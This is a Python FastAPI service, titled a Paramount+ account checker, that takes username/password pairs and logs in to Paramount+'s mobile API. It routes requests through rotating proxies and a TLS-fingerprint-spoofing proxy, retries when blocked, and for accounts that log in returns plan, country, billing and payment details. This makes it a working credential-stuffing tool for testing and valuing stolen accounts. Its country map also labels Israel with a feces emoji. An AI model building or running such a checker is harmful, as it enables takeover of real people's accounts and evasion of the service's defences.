import re
import secrets
import json
from typing import Optional

import httpx
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

# ------------------------------------------------------------------------------
# Pydantic request/response models
# ------------------------------------------------------------------------------
class CheckRequest(BaseModel):
    username: str
    password: str
    proxy: Optional[str] = None          # format: "host:port:user:pass"
    use_proxy: Optional[bool] = False


class CheckResponse(BaseModel):
    success: bool
    message: Optional[str] = None
    device_id: Optional[str] = None
    country_code: Optional[str] = None
    country_name: Optional[str] = None
    plan: Optional[str] = None
    plan_type: Optional[str] = None
    billing_period: Optional[str] = None
    package: Optional[str] = None
    payment_method: Optional[str] = None


# ------------------------------------------------------------------------------
# FastAPI app
# ------------------------------------------------------------------------------
app = FastAPI(title="Paramount+ Account Checker (TLSProxy)")

# ------------------------------------------------------------------------------
# TLSProxy constants
# ------------------------------------------------------------------------------
TLS_PROXY_URL = "http://127.0.0.1:9000"
CHID = "HelloIOS_16"
H1_ORDER = (
    "sec-ch-ua,sec-ch-ua-mobile,sec-ch-ua-platform,upgrade-insecure-requests,"
    "user-agent,accept,sec-fetch-site,sec-fetch-mode,sec-fetch-user,sec-fetch-dest,"
    "accept-encoding,accept-language"
)
H2_ORDER = "auto"
H2_SETTINGS = '{"mode": "auto"}'

# ------------------------------------------------------------------------------
# User‑Agent & country map (same as before)
# ------------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
]

COUNTRY_MAP = {
    "AF": "Afganistan 🇦🇫",
    "AX": "Åland Islands 🇦🇽",
    "AL": "Albania 🇦🇱",
    "DZ": "Algeria 🇩🇿",
    "AS": "American Samoa 🇦🇸",
    "AD": "Andorra 🇦🇩",
    "AO": "Angola 🇦🇴",
    "AI": "Anguilla 🇦🇮",
    "AQ": "Antartica 🇦🇶",
    "AG": "Antigua and Barbuda 🇦🇬",
    "AR": "Argentina 🇦🇷",
    "AM": "Armenia 🇦🇲",
    "AW": "Aruba 🇦🇼",
    "AU": "Australia 🇦🇺",
    "AT": "Austria 🇦🇹",
    "AZ": "Azerbaijan 🇦🇿",
    "BS": "Bahamas 🇧🇸",
    "BH": "Bahrain 🇧🇭",
    "BD": "Bangladesh 🇧🇩",
    "BB": "Barbados 🇧🇧",
    "BY": "Belarus 🇧🇾",
    "BE": "Belgium 🇧🇪",
    "BZ": "Belize 🇧🇿",
    "BJ": "Benin 🇧🇯",
    "BM": "Bermuda 🇧🇲",
    "BT": "Bhutan 🇧🇹",
    "BO": "Bolivia 🇧🇴",
    "BQ": "Bonaire",
    "BA": "Bosnia and Herzegovina 🇧🇦",
    "BW": "Botswana 🇧🇼",
    "BR": "Brazil 🇧🇷",
    "IO": "British Indian Ocean Territory 🇮🇴",
    "VG": "British Virgin Islands 🇻🇬",
    "BN": "Brunei 🇧🇳",
    "BG": "Bulgaria 🇧🇬",
    "BF": "Burkina Faso 🇧🇫",
    "BI": "Burundi 🇧🇮",
    "KH": "Cambodia 🇰🇭",
    "CM": "Cameroon 🇨🇲",
    "CA": "Canada 🇨🇦",
    "IC": "Canary Islands 🇮🇨",
    "CV": "Cape Verde 🇨🇻",
    "KY": "Cayman Islands 🇰🇾",
    "CF": "Central African Republic 🇨🇫",
    "TD": "Chad 🇷🇴",
    "CL": "Chile 🇨🇱 ",
    "CN": "China 🇨🇳",
    "CX": "Christmas Island 🇨🇽",
    "CC": "Cocos (Keeling) Islands 🇨🇨",
    "CO": "Colombia 🇨🇴",
    "KM": "Comoros 🇰🇲",
    "CG": "Republic Congo 🇨🇬",
    "CD": "Democratic Congo 🇨🇩",
    "CK": "Cook Islands 🇨🇰",
    "CR": "Costa Rica 🇨🇷",
    "CI": "CÃ´te d'Ivoire 🇨🇮",
    "HR": "Croatia 🇭🇷",
    "CU": "Cuba 🇨🇺",
    "CW": "CuraÃ§ao 🇨🇼",
    "CY": "Cyprus 🇨🇾",
    "CZ": "Czech Republic 🇨🇿",
    "DK": "Denmark 🇩🇰",
    "DJ": "Djibouti 🇩🇯",
    "DM": "Dominica 🇩🇲",
    "DO": "Dominican Republic 🇩🇴",
    "EC": "Ecuador 🇪🇨",
    "EG": "Egypt 🇪🇬",
    "SV": "El Salvador 🇸🇻",
    "GQ": "Equatorial Guinea 🇬🇶",
    "ER": "Eritrea 🇪🇷",
    "EE": "Estonia 🇪🇪",
    "ET": "Eswatini 🇸🇿",
    "FK": "Falkland Islands 🇫🇰",
    "FO": "Faroe Islands 🇫🇴",
    "FJ": "Fiji 🇫🇯",
    "FI": "Finland 🇫🇮",
    "FR": "France 🇫🇷",
    "GF": "French Guiana 🇬🇫",
    "PF": "French Polynesia 🇵🇫",
    "TF": "French Southern Territories 🇹🇫",
    "GA": "Gabon 🇬🇦",
    "GM": "Gambia 🇬🇲",
    "GE": "Georgia 🇬🇪",
    "DE": "Germany 🇩🇪",
    "GH": "Ghana 🇬🇭",
    "GI": "Gibraltar 🇬🇮",
    "GR": "Greece 🇬🇷",
    "GL": "Greenland 🇬🇱",
    "GD": "Grenada 🇬🇩",
    "GP": "Guadeloupe 🇬🇵",
    "GU": "Guam 🇬🇺",
    "GT": "Guatemala 🇬🇹",
    "GG": "Guernsey 🇬🇬",
    "GN": "Guinea 🇬🇳",
    "GW": "Guinea-Bissau 🇬🇼",
    "GY": "Guyana 🇬🇾",
    "HT": "Haiti 🇭🇹",
    "HN": "Honduras 🇭🇳",
    "HK": "Hong Kong 🇭🇰",
    "HU": "Hungary 🇭🇺",
    "IS": "Iceland 🇮🇸",
    "IN": "India 🇮🇳",
    "ID": "Indonesia 🇮🇩",
    "IR": "Iran 🇮🇷",
    "IQ": "Iraq 🇮🇶",
    "IE": "Ireland 🇮🇪",
    "IM": "Isle of Man 🇮🇲",
    "IL": "Israel 💩",
    "IT": "Italy 🇮🇹",
    "JM": "Jamaica 🇯🇲",
    "JP": "Japan 🇯🇵",
    "JE": "Jersey 🇯🇪",
    "JO": "Jordan 🇯🇴",
    "KZ": "Kazakhstan 🇰🇿",
    "KE": "Kenya 🇰🇪",
    "KI": "Kiribati 🇰🇮",
    "XK": "Kosovo 🇽🇰",
    "KW": "Kuwait 🇰🇼",
    "KG": "Kyrgyzstan 🇰🇬",
    "LA": "Laos 🇱🇦",
    "LV": "Latvia 🇱🇻",
    "LB": "Lebanon 🇱🇧",
    "LS": "Lesotho 🇱🇸",
    "LR": "Liberia 🇱🇷",
    "LY": "Libya 🇱🇾",
    "LI": "Liechtenstein 🇱🇮",
    "LT": "Lithuania 🇱🇹",
    "LU": "Luxembourg 🇱🇺",
    "MO": "Macau 🇲🇴",
    "MG": "Madagascar 🇲🇬",
    "MW": "Malawi 🇲🇼",
    "MY": "Malaysia 🇲🇾",
    "MV": "Maldives 🇲🇻",
    "ML": "Mali 🇲🇱",
    "MT": "Malta 🇲🇹",
    "MH": "Marshall Islands 🇲🇭",
    "MQ": "Martinique 🇲🇶",
    "MR": "Mauritania 🇲🇷",
    "MU": "Mauritius 🇲🇺",
    "YT": "Mayotte 🇾🇹",
    "MX": "Mexico 🇲🇽",
    "FM": "Micronesia 🇫🇲",
    "MD": "Moldova 🇲🇩",
    "MC": "Monaco 🇲🇨",
    "MN": "Mongolia 🇲🇳",
    "ME": "Montenegro 🇲🇪",
    "MS": "Montserrat 🇲🇸",
    "MA": "Morocco 🇲🇦",
    "MZ": "Mozambique 🇲🇿",
    "MM": "Myanmar 🇲🇲",
    "NA": "Namibia 🇳🇦",
    "NR": "Nauru 🇳🇷",
    "NP": "Nepal 🇳🇵",
    "NL": "Netherlands 🇳🇱",
    "NC": "New Caledonia 🇳🇨",
    "NZ": "New Zealand 🇳🇿",
    "NI": "Nicaragua 🇳🇮",
    "NE": "Niger 🇳🇪",
    "NG": "Nigeria 🇳🇬",
    "NU": "Niue 🇳🇺",
    "NF": "Norfolk Island 🇳🇫",
    "KP": "North Korea 🇰🇵",
    "MK": "North Macedonia 🇲🇰",
    "MP": "Northern Mariana Islands 🇲🇵",
    "NO": "Norway 🇳🇴",
    "OM": "Oman 🇴🇲",
    "PK": "Pakistan 🇵🇰",
    "PW": "Palau 🇵🇼",
    "PS": "Palestine 🇵🇸",
    "PA": "Panama 🇵🇦",
    "PG": "Papua New Guinea 🇵🇬",
    "PY": "Paraguay 🇵🇾",
    "PE": "Peru 🇵🇪",
    "PH": "Philippines 🇵🇭",
    "PN": "Pitcairn 🇵🇳",
    "PL": "Poland 🇵🇱",
    "PT": "Portugal 🇵🇹",
    "PR": "Puerto Rico 🇵🇷",
    "QA": "Qatar 🇶🇦",
    "RE": "Réunion 🇷🇪",
    "RO": "Romania 🇷🇴",
    "RU": "Russia 🇷🇺",
    "RW": "Rwanda 🇷🇼",
    "WS": "Samoa 🇼🇸",
    "SM": "San Marino 🇸🇲",
    "ST": "Sao Tome and Principe 🇸🇹",
    "SA": "Saudi Arabia 🇸🇦",
    "SN": "Senegal 🇸🇳",
    "RS": "Serbia 🇷🇸",
    "SC": "Seychelles 🇸🇨",
    "SL": "Sierra Leone 🇸🇱",
    "SG": "Singapore 🇸🇬",
    "SX": "Sint Maarten 🇸🇽",
    "SK": "Slovakia 🇸🇰",
    "SI": "Slovenia 🇸🇮",
    "GS": "South Georgia and the South Sandwich Islands 🇬🇸",
    "SB": "Solomon Islands 🇸🇧",
    "SO": "Somalia 🇸🇴",
    "ZA": "South Africa 🇿🇦",
    "KR": "South Korea 🇰🇷",
    "SS": "South Sudan 🇸🇸",
    "ES": "Spain 🇪🇸",
    "LK": "Sri Lanka 🇱🇰",
    "BL": "St. Barthélemy 🇧🇱",
    "SH": "Saint Helena, Ascension and Tristan da Cunha 🇸🇭",
    "KN": "Saint Kitts and Nevis 🇰🇳",
    "LC": "St. Lucia 🇱🇨",
    "PM": "Saint Pierre and Miquelon 🇵🇲",
    "VC": "Saint Vincent and the Grenadines 🇻🇨",
    "SD": "Sudan 🇸🇩",
    "SR": "Suriname 🇸🇷",
    "SZ": "Swaziland 🇸🇿",
    "SE": "Sweden 🇸🇪",
    "CH": "Switzerland 🇨🇭",
    "SY": "Syrian Arab Republic 🇸🇾",
    "TW": "Taiwan 🇹🇼",
    "TJ": "Tajikistan 🇹🇯",
    "TZ": "Tanzania 🇹🇿",
    "TH": "Thailand 🇹🇭",
    "TL": "Timor-Leste 🇹🇱",
    "TG": "Togo 🇹🇬",
    "TK": "Tokelau 🇹🇰",
    "TO": "Tonga 🇹🇴",
    "TT": "Trinidad and Tobago 🇹🇹",
    "TN": "Tunisia 🇹🇳",
    "TR": "Turkey 🇹🇷",
    "TM": "Turkmenistan 🇹🇲",
    "TC": "Turks and Caicos Islands 🇹🇨",
    "TV": "Tuvalu 🇹🇻",
    "UG": "Uganda 🇺🇬",
    "UA": "Ukraine 🇺🇦",
    "AE": "UAE 🇦🇪",
    "GB": "United Kingdom 🇬🇧",
    "US": "United States 🇺🇸",
    "UY": "Uruguay 🇺🇾",
    "UZ": "Uzbekistan 🇺🇿",
    "VI": "Virgin Islands 🇻🇮",
    "VU": "Vanuatu 🇻🇺",
    "VA": "Vatican 🇻🇦",
    "VE": "Venezuela 🇻🇪",
    "VN": "Vietnam 🇻🇳",
    "WF": "Wallis and Futuna 🇼🇫",
    "EH": "Western Sahara 🇪🇭",
    "YE": "Yemen 🇾🇪",
    "ZM": "Zambia 🇿🇲",
    "ZW": "Zimbabwe 🇿🇼",
}

# ------------------------------------------------------------------------------
# Helper functions
# ------------------------------------------------------------------------------
def generate_device_id() -> str:
    return secrets.token_hex(8).lower()

def get_random_user_agent() -> str:
    return secrets.choice(USER_AGENTS)

def parse_proxy(proxy_str: str):
    """Parse 'host:port:user:pass' -> (proxy_url, userpass, ipport)."""
    parts = proxy_str.split(':')
    if len(parts) < 4:
        raise ValueError("Proxy must be in format 'host:port:user:pass'")
    ipport = f"{parts[0]}:{parts[1]}"
    userpass = ':'.join(parts[2:])
    proxy_url = f"http://{userpass}@{ipport}"
    return proxy_url, userpass, ipport

def get_common_headers(user_agent: str) -> dict:
    """Base headers sent to TLSProxy (mirrors the original script)."""
    return {
        "Host": "www.intl.paramountplus.com",
        "Cookie": "CBS_DEVICEID=",              # exactly as in script
        "Cache-Control": "max-age=0",
        "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
        "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
        "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3MDZkNjlkNTc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0=",
        "User-Agent": user_agent,
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
    }

def build_tls_proxy_headers(
    target_url: str,
    target_method: str,
    user_agent: str,
    proxy_override: Optional[str] = None
) -> dict:
    """Build the full headers for the TLSProxy request."""
    headers = get_common_headers(user_agent)
    # TLSProxy specific headers
    headers["x-tp-h1order"] = H1_ORDER
    headers["x-tp-h2order"] = H2_ORDER
    headers["x-tp-url"] = target_url
    headers["x-tp-method"] = target_method
    headers["x-tp-h2settings"] = H2_SETTINGS
    headers["x-tp-chid"] = CHID
    if proxy_override:
        headers["x-tp-proxy"] = proxy_override
    return headers


# ------------------------------------------------------------------------------
# Core check function (now using TLSProxy)
# ------------------------------------------------------------------------------
async def perform_check(request: CheckRequest) -> CheckResponse:
    device_id = generate_device_id()
    user_agent = get_random_user_agent()

    # Build the proxy URL for x-tp-proxy if needed
    tp_proxy_override = None
    if request.use_proxy and request.proxy:
        try:
            tp_proxy_override, _, _ = parse_proxy(request.proxy)
        except ValueError as e:
            return CheckResponse(success=False, message=f"Proxy parsing error: {e}")

    # We use a single client for both requests (connection reuse is fine)
    async with httpx.AsyncClient(timeout=120.0, http2=True) as client:
        # ---------- First request: login (POST) ----------
        login_url = (
            "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json"
            "?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
        )
        login_headers = build_tls_proxy_headers(login_url, "POST", user_agent, tp_proxy_override)
        login_body = f"j_username={request.username}&j_password={request.password}&deviceId={device_id}"

        max_retries = 3
        for attempt in range(max_retries):
            try:
                # TLSProxy expects the outer method to match x-tp-method, so we POST
                resp = await client.post(TLS_PROXY_URL, content=login_body, headers=login_headers)
            except httpx.HTTPError as e:
                if attempt == max_retries - 1:
                    return CheckResponse(success=False, message=f"Login request failed: {e}")
                continue

            status = resp.status_code
            if status in (500, 403, 406):
                if attempt == max_retries - 1:
                    return CheckResponse(success=False, message=f"Login retry exhausted, last status {status}")
                continue
            break

        text = resp.text
        if "Invalid username/password pair" in text or '"status":400,"error":"Bad Request"' in text:
            return CheckResponse(success=False, message="Invalid username/password or bad request")
        if "userId" not in text:
            return CheckResponse(success=False, message="Login response missing userId")

        # ---------- Second request: status (GET) ----------
        status_url = (
            "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json"
            "?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
        )
        status_headers = build_tls_proxy_headers(status_url, "GET", user_agent, tp_proxy_override)

        for attempt in range(max_retries):
            try:
                # Outer method is GET (as x-tp-method is GET)
                resp_status = await client.get(TLS_PROXY_URL, headers=status_headers)
            except httpx.HTTPError as e:
                if attempt == max_retries - 1:
                    return CheckResponse(success=False, message=f"Status request failed: {e}")
                continue

            status = resp_status.status_code
            if status in (500, 403, 406):
                if attempt == max_retries - 1:
                    return CheckResponse(success=False, message=f"Status retry exhausted, last status {status}")
                continue
            break

        status_text = resp_status.text
        # The original script has a custom keycheck with banIfNoMatch=False,
        # so we don't fail even if "NEW_FREE_PACKAGE" or '"planType":null,' are missing.

        # Parse JSON
        try:
            data = json.loads(status_text)
        except json.JSONDecodeError:
            return CheckResponse(success=False, message="Status response is not valid JSON")

        subscription_country = data.get("subscriptionCountry", "") or ""
        product_name = data.get("productName", "") or ""
        plan_type = data.get("planType", "") or ""
        billing_cadence = data.get("billingCadence", "") or ""
        package_code = data.get("packageCode", "") or ""
        package_source = data.get("packageSource", "") or ""

        country_name = COUNTRY_MAP.get(subscription_country, subscription_country)

        return CheckResponse(
            success=True,
            message="Account details retrieved",
            device_id=device_id,
            country_code=subscription_country,
            country_name=country_name,
            plan=product_name,
            plan_type=plan_type,
            billing_period=billing_cadence,
            package=package_code,
            payment_method=package_source,
        )


# ------------------------------------------------------------------------------
# FastAPI endpoint
# ------------------------------------------------------------------------------
@app.post("/check", response_model=CheckResponse)
async def check_account(req: CheckRequest):
    try:
        result = await perform_check(req)
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/health")
async def health():
    return {"status": "ok"}
